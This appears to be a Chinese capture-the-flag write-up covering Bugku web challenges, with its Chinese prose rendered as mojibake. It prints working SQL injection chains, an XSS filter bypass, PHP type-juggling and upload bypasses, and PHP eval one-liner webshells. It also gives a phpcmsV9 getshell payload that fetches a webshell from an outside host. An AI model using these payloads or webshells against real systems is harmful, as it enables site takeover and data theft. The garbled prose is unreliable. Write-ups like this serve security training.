æŸ¥çœ‹flag</h2><p>5ä½æ•°ï¼Œç”¨pythonå†™ä¸ªå­—å…¸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f=open(&apos;5ä½æ•°.txt&apos;,&apos;w&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(10000,100000):</span><br><span class="line">print i</span><br><span class="line">f.write(str(i))</span><br><span class="line">f.write(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨bpæš´åŠ›ç ´è§£,å¯†ç æ˜¯13579<br><img src="https://s1.ax1x.com/2018/05/20/Cg6d1g.png" alt="Cg6d1g.png"></p><h2 id="ç‚¹å‡»ä¸€ä¸‡æ¬¡"><a href="#ç‚¹å‡»ä¸€ä¸‡æ¬¡" class="headerlink" title="ç‚¹å‡»ä¸€ä¸‡æ¬¡"></a>ç‚¹å‡»ä¸€ä¸‡æ¬¡</h2><p>å³å‡»å®¡æŸ¥å…ƒç´ ,å‘ç°åªè¦clickså‚æ•°å¤§äº1000000æ‰ä¼šå‡ºç°flagï¼Œåœ¨æ§åˆ¶å°é‡Œé¢è¾“å…¥clicks&gt;1000000çš„æ•°å­—å³å¯ï¼Œè®°å¾—æœ€åè¿˜è¦ç‚¹ä¸€ä¸‹æ‰å‡ºç°flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg6s7q.png" alt="Cg6s7q.png"></p><h2 id="å‰å¥³å‹"><a href="#å‰å¥³å‹" class="headerlink" title="å‰å¥³å‹"></a>å‰å¥³å‹</h2><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªcode.txtæ‰“å¼€ä¸€çœ‹åŸæ¥æ˜¯ä»£ç å®¡è®¡é—®é¢˜<br>åˆ©ç”¨äº†==å¼±ç±»å‹ä»¥åŠstrcmp()å‡½æ•°ï¼Œå®ƒæ— æ³•å¤„ç†å¤„ç†æ•°ç»„<br>è¿™é‡Œæœ‰ä¸¤ä¸ªMD5åå¯ä»¥å¼±ç±»å‹æˆªæ–­çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>å…³é”®payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[]=1</span><br></pre></td></tr></table></figure><h2 id="æˆç»©æŸ¥è¯¢"><a href="#æˆç»©æŸ¥è¯¢" class="headerlink" title="æˆç»©æŸ¥è¯¢"></a>æˆç»©æŸ¥è¯¢</h2><p>ä¸€ä¸ªç®€å•çš„SQLæ³¨å…¥é¢˜æ²¡æœ‰è¿‡æ»¤ï¼Œè¾“å…¥å•å¼•å·ä¸å›æ˜¾ï¼Œå†åŠ ä¸€ä¸ªæ³¨é‡Šå›æ˜¾ï¼Œä¾¿çŒœæµ‹SQLè¯­å¥åº”è¯¥æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from **** where id=&apos;&apos;;</span><br></pre></td></tr></table></figure><p>ç”¨hackbarå»postæ•°æ®<br>å…ˆäºŒåˆ†æ³•çœ‹æœ‰å‡ åˆ— id=1â€™ order by 4##<br>éªŒè¯å››åˆ—åˆ°åº•æ€ä¹ˆæ˜¾ç¤º  <code>id=-1&#39; union select 1,2,3,4 ##</code>  è¿™é‡Œid=-1ï¼Œæ˜¯ä¸ºäº†è®©å‰é¢çš„è¯­å¥ä¸ºç©ºï¼Œè®©åé¢çš„è¯­å¥å›æ˜¾<br>çˆ†åº“  <code>id=-1&#39; union select 1,2,3,database() ##</code>   å°±ä¸€ä¸ªæ•°æ®åº“<br>çˆ†è¡¨   <code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;##</code> ä¸¤ä¸ªè¡¨åˆ†åˆ«æ˜¯    fl4g,sc<br>è‚¯å®šæ˜¯fl4gè¡¨ï¼Œæ¥ä¸‹æ¥çˆ†å­—æ®µ <code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39; ##</code><br>çˆ†å†…å®¹ <code>id=-1&#39; union select 1,2,3,skctf_flag from `fl4g` ##</code></p><h2 id="å„ç§ç»•è¿‡"><a href="#å„ç§ç»•è¿‡" class="headerlink" title="å„ç§ç»•è¿‡"></a>å„ç§ç»•è¿‡</h2><p>è¿˜æ˜¯åˆ©ç”¨äº†sha1ä¸èƒ½å¤„ç†æ•°ç»„çš„ç‰¹æ€§ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚<br>ä¸‹é¢æ˜¯payload<br><img src="https://s1.ax1x.com/2018/05/20/Cg6fc4.png" alt="Cg6fc4.png"></p><h2 id="ç»†å¿ƒ"><a href="#ç»†å¿ƒ" class="headerlink" title="ç»†å¿ƒ"></a>ç»†å¿ƒ</h2><p>ç›®å½•ä¸‹å‘ç°robots.txtï¼Œé‡Œé¢æœ‰ä¸€ä¸ªç›®å½•<br><img src="https://s1.ax1x.com/2018/05/20/Cg6oH1.png" alt="Cg6oH1.png"><br>äºæ˜¯å°±åˆ°å¦å¤–ä¸€ä¸ªç›®å½•çœ‹ä¸€ä¸‹ï¼Œå‘ç°ä¸‹é¢æœ‰è¡Œå­—ï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/Cg6b4K.png" alt="Cg6b4K.png"><br>åˆæƒ³åˆ°æç¤ºé‡Œé¢çš„ç®¡ç†å‘˜ï¼ŒçŒœæµ‹å¯†ç å¯èƒ½æ˜¯adminæˆ–è€…æ˜¯administratorï¼Œå°è¯•ç¬¬ä¸€ä¸ªçš„æ—¶å€™å°±å¯¹äº†<br><img src="https://s1.ax1x.com/2018/05/20/Cg6L9O.png" alt="Cg6L9O.png"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>å…ˆæ¥æœ€ç®€å•çš„å¼¹çª—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;srcipt&gt;altert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç <br><img src="https://s1.ax1x.com/2018/05/20/Cg6zDA.png" alt="Cg6zDA.png"><br>å‘ç°&lt;&gt;è¢«è¿‡æ»¤æ‰äº†<br>è¿™é‡Œå­¦åˆ°ä¸€ä¸ªæŠ€å·§ï¼Œå°±æ˜¯ç”¨Unicodeç¼–ç ç»•è¿‡<br>payload:<code>?id=\u003cimg src=1 onerror=alert(_key_)\u003e</code></p><h2 id="é€Ÿåº¦è¦å¿«"><a href="#é€Ÿåº¦è¦å¿«" class="headerlink" title="é€Ÿåº¦è¦å¿«"></a>é€Ÿåº¦è¦å¿«</h2><p>è¿™ç§é¢˜å°±æ˜¯ç¼–ç¨‹é¢˜<br>ä¸Šè„šæœ¬ï¼Œæ³¨æ„è¿™é¢˜æ˜¯ç”¨marginã€‚ã€‚ã€‚ã€‚æŸ¥çœ‹æºç å¯çŸ¥<br><img src="https://s1.ax1x.com/2018/05/20/CgcSHI.png" alt="CgcSHI.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url =&apos;http://120.24.86.145:8002/web6/&apos;</span><br><span class="line"></span><br><span class="line">r =requests.session()</span><br><span class="line"></span><br><span class="line">headers = r.get(url).headers</span><br><span class="line">##flag = head[&apos;Flag&apos;].split(&apos;:&apos;)[0]   æ³¨æ„responseçš„é”®</span><br><span class="line">##print flag</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(base64.b64decode(headers[&apos;flag&apos;]).split(&apos;:&apos;)[1])</span><br><span class="line">data=&#123;&apos;margin&apos;:flag&#125;</span><br><span class="line">print r.post(url=url,data=data).content ##.text</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ"><a href="#å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ" class="headerlink" title="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ"></a>å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ</h2><p>è¿›å»ä¸€çœ‹æ˜¯æ¡ä»£ç å®¡è®¡é¢˜ç›®<br><img src="https://s1.ax1x.com/2018/05/20/Cgc9Et.png" alt="Cgc9Et.png"><br>è¿™é‡ŒåŠ ä¸Šåˆ«äººè·Ÿè‡ªå·±å¯¹äºæ­£åˆ™çš„å¸¸è§„æ€»ç»“</p><pre><code>1.è¡¨è¾¾å¼ç›´æ¥å†™å‡ºæ¥çš„å­—ç¬¦ä¸²ç›´æ¥åˆ©ç”¨ï¼Œå¦‚key2.â€œ.â€ä»£è¡¨ä»»æ„å­—ç¬¦3.â€œ*â€ä»£è¡¨ä¸€ä¸ªæˆ–ä¸€åºåˆ—å­—ç¬¦é‡å¤å‡ºç°çš„æ¬¡æ•°ï¼Œå³å‰ä¸€ä¸ªå­—ç¬¦é‡å¤ä»»æ„æ¬¡ï¼Œè¿™é‡Œå¯ä»¥æ˜¯0æ¬¡ï¼Œè¿˜æœ‰å°±æ˜¯ä»¥&apos;^&apos;å¼€å¤´ï¼Œä»¥&apos;$&apos;ç»“æŸ4.â€œ\/â€ä»£è¡¨â€œ/â€ï¼Œä¸€ç§è½¬ä¹‰ï¼Œå› ä¸ºå•ç‹¬çš„//ä»£è¡¨ç€æ­£åˆ™çš„å¼€å§‹ä¸ç»“æŸ5.[a-z]ä»£è¡¨a-zä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦6.[[:punct:]]ä»£è¡¨ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼ŒåŒ…æ‹¬å„ç§ç¬¦å·ï¼Œè®°å¾—æ˜¯ç¬¦å·7./iä»£è¡¨å¤§å°å†™ä¸æ•æ„Ÿ8.{4-7}ä»£è¡¨[0-9]ä¸­æ•°å­—è¿ç»­å‡ºç°çš„æ¬¡æ•°æ˜¯4-7æ¬¡9.\såŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦10.\d    åŒ¹é…æ•°å­—11.\b    åŒ¹é…å•è¯çš„å¼€å§‹æˆ–ç»“æŸ</code></pre><p>è‡ªå·±çš„payload:<code>?id=keyakey1111key:/a/akeya@</code></p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>è¿™ä¸ªé¢˜ç›®åˆå­¦åˆ°äº†æ–°çŸ¥è¯†<br>åˆ©ç”¨äº†file_get_contentsçš„ç‰¹æ€§ï¼Œå½“ç”¨åˆ°php://inputçš„æ—¶å€™ï¼Œfile_get_contentsæ”¯æŒå­—èŠ‚æµè¾“å…¥ï¼Œåªè¦æ„é€ php://input,ä¸”postæ•°æ®è¿‡å»å³å¯<br>payload:?ac=1&amp;php://inputç„¶åå†postä¸€ä¸ª 1å³å¯</p><h2 id="æ±‚getshell"><a href="#æ±‚getshell" class="headerlink" title="æ±‚getshell"></a>æ±‚getshell</h2><p>è¿™ä¸€é“é¢˜ç›®åˆå­¦åˆ°æ–°çŸ¥è¯†ã€‚ã€‚ã€‚ã€‚<br>ç”¨PHPåˆ«åæ¥ç»•è¿‡ã€‚ã€‚ã€‚php2, php3, php4, php5, phps, pht, phtm, phtml<br>ç„¶åå‚è€ƒäº†å¤§ä½¬ä»¬çš„wp<br>å‘ç°è¿™ä¸€é¢˜è¿˜è¦æŠŠContent-Type: multipart/form-data; æ”¹æˆå¤§å°å†™ç»•è¿‡çš„å½¢å¼ï¼Œæ”¹ä¸ºContent-Type: Multipart/form-data;<br>ç„¶åç”¨åˆ«åå»å°è¯•php5çš„æ—¶å€™å‡ºç°flag<br><img src="https://s1.ax1x.com/2018/05/20/CgcCUP.png" alt="CgcCUP.png"></p><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸€ä¸ª1p.html<br>æ‰“å¼€ä¸€çœ‹é‡Œé¢æœ‰jsä»£ç ï¼Œç›´æ¥æ”¾åˆ°æ§åˆ¶å°é‡Œé¢çœ‹ä¸€ä¸‹<br>å‘ç°è·³è½¬åˆ°è®ºå›ï¼Œç„¶åä¸çŸ¥é“è¦å¹²å˜›ã€‚ã€‚ã€‚ã€‚ã€‚<br>è¿˜æ˜¯å…ˆè½¬ä¹‰ä¸€ä¸‹é‚£æ®µä¸œè¥¿å§ï¼Œå…ˆurldecodeï¼Œå†å‘ç°é‡Œé¢æœ‰base64ï¼Œç„¶åå†ä¸€æ¬¡urldecodeå‘ç°ä¸€æ®µä»£ç <br><img src="https://s1.ax1x.com/2018/05/20/Cgfi6O.png" alt="Cgfi6O.png"><br><img src="https://s1.ax1x.com/2018/05/20/CgfFXD.png" alt="CgfFXD.png"><br>å‘ç°æœ‰ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œä¸ç®¡é‚£ä¹ˆå¤šï¼Œå…ˆè®¿é—®ä¸€ä¸‹<br>å¾—åˆ°flag</p><h2 id="è¿‡ç‹—ä¸€å¥è¯"><a href="#è¿‡ç‹—ä¸€å¥è¯" class="headerlink" title="è¿‡ç‹—ä¸€å¥è¯"></a>è¿‡ç‹—ä¸€å¥è¯</h2><p>è¿™ä¸ªä¸€å¥è¯æ˜¯getæ–¹å¼å‘é€æ•°æ®<br>å…ˆäº†è§£ä¸€äº›å‡½æ•°<br>phpinfo()å‡½æ•°æŸ¥çœ‹ä¿¡æ¯<br>çœ‹çœ‹æ ¹ç›®å½•ä¸‹æœ‰å“ªäº›æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&quot;./&quot;))</span><br><span class="line">print_r(glob(&quot;*&quot;))</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸€ä¸ªflag.txtï¼Œç›´æ¥è®¿é—®å³å¯ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸‹é¢çš„å‡½æ•°æ‰“å°å‡ºæ¥<br>ä¸€äº›å¸¸ç”¨çš„è¾“å‡ºæ–‡ä»¶å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(file(&apos;flag.txt&apos;)),è¿™é‡Œçš„print_ræ¢æˆvar_dumpä¹Ÿè¡Œ</span><br><span class="line">show_source(&quot;flag.txt&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CgfE0H.png" alt="CgfE0H.png"></p><h2 id="Webè¿›é˜¶"><a href="#Webè¿›é˜¶" class="headerlink" title="Webè¿›é˜¶"></a>Webè¿›é˜¶</h2><h2 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h2><p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å°è¯•è¿™æ ·çš„æ¼æ´ã€‚ã€‚ã€‚ã€‚ã€‚<br>å…ˆç™¾åº¦ä¸€ä¸‹ï¼Œå‘ç°phpcmsV9å­˜åœ¨å‰å°æ³¨å†Œé¡µé¢å­˜åœ¨getshellæ¼æ´ï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/Cgf6E9.png" alt="Cgf6E9.png"><br>å…ˆç”¨bpæŠ“åŒ…ï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/Cgf0jU.png" alt="Cgf0jU.png"><br>åœ¨æœ€ä¸‹é¢çš„postæ•°æ®é‡Œé¢åŠ ä¸Š<code>&amp;info[content]=&lt;img src=http://www.bugku.com/tools/phpyijuhua.txt?.php##.jpg&gt;</code></p><p>è¿™é‡Œé¢çš„é“¾æ¥æ˜¯Bugkuè®ºå›é‡Œé¢çš„ç°æˆçš„å°é©¬ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªã€‚ã€‚ã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CgfwcT.png" alt="CgfwcT.png"><br>ç„¶åå¤åˆ¶goä¹‹åè¿”å›æ•°æ®åŒ…é‡Œé¢çš„é“¾æ¥ï¼Œä¹Ÿå°±æ˜¯å³è¾¹çš„ç®­å¤´ï¼Œç”¨èœåˆ€é“¾æ¥ã€‚ã€‚ã€‚è¯´èµ·è¿™ä¸ªèœåˆ€è¿™å·¥å…·ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡çœŸæ­£ç”¨å®ƒå®æ“ï¼Œä»¥å‰æˆ‘éƒ½æ˜¯çœ‹è§†é¢‘çœ‹åˆ«äººç”¨çš„ã€‚ã€‚ã€‚ï¿£â–¡ï¿£ï½œï½œ<br><img src="https://s1.ax1x.com/2018/05/20/Cgfd3V.png" alt="Cgfd3V.png"></p><p>è¿æ¥ä¹‹ååœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagçš„å›¾ç‰‡ï¼Œæ”¾è¿›HXDé‡Œé¢å°±èƒ½æ‰¾åˆ°flagäº†ã€‚ã€‚ã€‚ã€‚</p><p>å•Šï¼Œè¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥ç”¨bugkuè®ºå›é‡Œé¢çš„getshellå·¥å…·ï¼Œè‡ªåŠ¨å‡ºæ¥shellåœ°å€ï¼Œç„¶åèœåˆ€é“¾æ¥é‚£ä¸ªåœ°å€å³å¯<br><img src="https://s1.ax1x.com/2018/05/20/Cgfa90.png" alt="Cgfa90.png"></p><p>è¯´èµ·æ¥æˆ‘è¿˜æ˜¯å–œæ¬¢ä¸Šé¢çš„æ–¹æ³•ï¼Œå¤ç°ä¸€ä¸‹ä¹Ÿè›®å¥½çš„ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>å› ä¸ºé¢˜ç›®æç¤ºhintï¼Œäºæ˜¯å°±è¾“å…¥?hint<br><img src="https://s1.ax1x.com/2018/05/20/CgfYAs.png" alt="CgfYAs.png"><br>åŸæ¥æ˜¯ä»£ç å®¡è®¡é¢˜ç›®<br>è€ƒäº†ä¸€ä¸ªååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹<br>æ„é€ payload,ä½†æ˜¯æ³¨æ„ä»£ç ä¸­if-elseçš„èŒƒå›´ï¼Œå€’æ•°ç¬¬äºŒè¡Œä¸­ç¡®å®ä¸ºå˜é‡KEYèµ‹å€¼äº†ï¼Œä½†æ˜¯å®ƒæ˜¯åœ¨å¦ä¸€ä¸ªelseé‡Œ<br>åœ¨è¿›è¡Œä¸¥æ ¼æ¯”è¾ƒå‰ï¼Œå˜é‡KEYçš„å€¼å¹¶æ²¡æœ‰è¢«èµ‹å€¼<br>æ‰€ä»¥KEYä¸ºç©ºå€¼<br>ç„¶ååœ¨bpä¸Šæ„å»ºpayload<br><img src="https://s1.ax1x.com/2018/05/20/CgfG7j.png" alt="CgfG7j.png"></p><h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2><p>æ‰“å¼€ä¸€çœ‹ä¸€ä¸²ä¸œè¥¿ï¼Œé¢˜ç›®ä¸æ˜¯è¯´æ˜¯å¤‡ä»½æ˜¯ä¸ªå¥½ä¸œè¥¿å—ã€‚ã€‚å¤‡ä»½çš„è¯å°±ä¼šæƒ³åˆ°æºç æ³„éœ²ä¹‹ç±»çš„ä¸œè¥¿ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸ªå¥½ç”¨çš„ä¸œè¥¿<br><a href="coding.net/u/yihangwang/p/SourceLeakHacker/git">SourceLeakHacker</a><br>ä¸Šå»ä¸€æ‰«ï¼Œå‘ç°æ–‡ä»¶<br><img src="https://s1.ax1x.com/2018/05/20/CgfljS.png" alt="CgfljS.png"><br><img src="https://s1.ax1x.com/2018/05/20/Cgf8BQ.png" alt="Cgf8BQ.png"><br>ä¸¤ç§payload:<br>ç¬¬ä¸€ç§æ˜¯åˆ©ç”¨MD5å‡½æ•°è¿”å›falseçš„ï¼Œç¬¬äºŒç§æ˜¯å¼±ç±»å‹ï¼ŒMD5ä¹‹åæ˜¯0eå¼€å¤´çš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?kkeyey1[]=1&amp;kkeyey2[]=2</span><br><span class="line">?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a</span><br></pre></td></tr></table></figure></p><h2 id="ç§‹åå±±è€å¸æœº"><a href="#ç§‹åå±±è€å¸æœº" class="headerlink" title="ç§‹åå±±è€å¸æœº"></a>ç§‹åå±±è€å¸æœº</h2><p>è„šæœ¬é¢˜ã€‚ã€‚ã€‚ã€‚è¿™æ˜¯æŸä½å¤§ä½¬çš„ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(&quot;http://120.24.86.145:8002/qiumingshan/&quot;)</span><br><span class="line">searchObj = re.search(r&apos;^&lt;div&gt;(.*)=\?;&lt;/div&gt;$&apos;, r.text, re.M | re.S)</span><br><span class="line">d = &#123;</span><br><span class="line">    &quot;value&quot;: eval(searchObj.group(1))</span><br><span class="line">&#125;</span><br><span class="line">r = s.post(&quot;http://120.24.86.145:8002/qiumingshan/&quot;, data=d)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="å­™xxçš„åšå®¢"><a href="#å­™xxçš„åšå®¢" class="headerlink" title="å­™xxçš„åšå®¢"></a>å­™xxçš„åšå®¢</h2><p>æ‰¾æ¥æ‰¾å»é¡µé¢å°±å‘ç°è¿™ç§ä¸œè¥¿<br><img src="https://s1.ax1x.com/2018/05/20/CgfK9P.png" alt="CgfK9P.png"><br>ç„¶åæ‰«æä»¥ä¸‹ç½‘ç«™<br>å‘ç°ä»¥ä¸‹å‡ ä¸ªç½‘ç«™<br><img src="https://s1.ax1x.com/2018/05/20/CgfM1f.png" alt="CgfM1f.png"><br>å…¶ä¸­æœ€æœ‰åˆ©ç”¨ä»·å€¼çš„æ˜¯phpmyadminï¼Œç”¨åˆšæ‰çš„é‚£ä¸ªwpé‚£ä¸ªä¸œè¥¿ç™»å½•å³å¯ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CgfQc8.png" alt="CgfQc8.png"></p><h2 id="sqlæ³¨å…¥2"><a href="#sqlæ³¨å…¥2" class="headerlink" title="sqlæ³¨å…¥2"></a>sqlæ³¨å…¥2</h2><p>è¿™é¢˜çœŸæ˜¯å¤ªå‘ã€‚ã€‚ã€‚ã€‚å“ªæœ‰ä»€ä¹ˆæ³¨å…¥ã€‚ã€‚ã€‚<br>æˆ‘æ˜¯çœ‹åˆ°åˆ«äººwpè¯´ç›´æ¥æ‰«ç›®å½•å³å¯ã€‚ã€‚ã€‚<br>æ‰¾åˆ°ä¸€ä¸ªå«flagçš„ä¸œè¥¿ä¸‹è½½ä¸‹æ¥ï¼ŒçœŸçš„æ°”æ­»</p><h2 id="è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»å½•ç•Œé¢"><a href="#è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»å½•ç•Œé¢" class="headerlink" title="è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»å½•ç•Œé¢"></a>è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„ç™»å½•ç•Œé¢</h2><p>ç®€å•çš„postæ³¨å…¥ï¼Œä»€ä¹ˆè¿‡æ»¤éƒ½æ²¡æœ‰ã€‚ã€‚ã€‚<br>å…ˆå°è¯•â€ æŠ¥é”™ï¼Œç„¶åæ„é€ è¯­å¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select order by 2##&amp;admin_passwd=&amp;submit=GO GO GO</span><br><span class="line">admin_name=-1&quot; union select 1,2##&amp;admin_passwd=&amp;submit=GO GO GO     ç¡®å®šå›æ˜¾</span><br><span class="line">admin_name=-1&quot; union select database(),2##&amp;admin_passwd=&amp;submit=GO GO GO</span><br><span class="line">admin_name=-1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=daTABASE()##&amp;admin_passwd=&amp;submit=GO GO GO</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/05/20/CgWq6U.png" alt="CgWq6U.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;flag1&apos;##&amp;admin_passwd=&amp;submit=GO GO GO</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/05/20/CgWLXF.png" alt="CgWLXF.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select flag1,2 from `flag1`##&amp;admin_passwd=&amp;submit=GO GO GO</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CgcAgg.png" alt="CgcAgg.png"></p><h2 id="æ–‡ä»¶åŒ…å«äºŒ"><a href="#æ–‡ä»¶åŒ…å«äºŒ" class="headerlink" title="æ–‡ä»¶åŒ…å«äºŒ"></a>æ–‡ä»¶åŒ…å«äºŒ</h2><p>ä¸¤ç§ç»•è¿‡æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯upload.phpä¸­æ˜¯ä¸èƒ½ä»¥phpè¿è¡Œçš„</p><h2 id="SQLçº¦æŸæ”»å‡»"><a href="#SQLçº¦æŸæ”»å‡»" class="headerlink" title="SQLçº¦æŸæ”»å‡»"></a>SQLçº¦æŸæ”»å‡»</h2><p>å‚è€ƒä¸‹é¢è¿™ä¸€ç¯‡æ–‡ç« <br><a href="http://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/124537.html</a><br>æ—¢å¯ä»¥å¾ˆå¿«æ„é€ payloadäº†<br>éšä¾¿ä¸€ä¸ªç”¨æˆ·ååŠ ä¸Šä¸€ä¸ªè¶…è¿‡å®ƒæ•°æ®åº“è§„å®šçš„é•¿åº¦å³å¯</p><h2 id="welcome-to-bugku"><a href="#welcome-to-bugku" class="headerlink" title="welcome to bugku"></a>welcome to bugku</h2><p>æŠ“åŒ…å‘ç°æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line"> 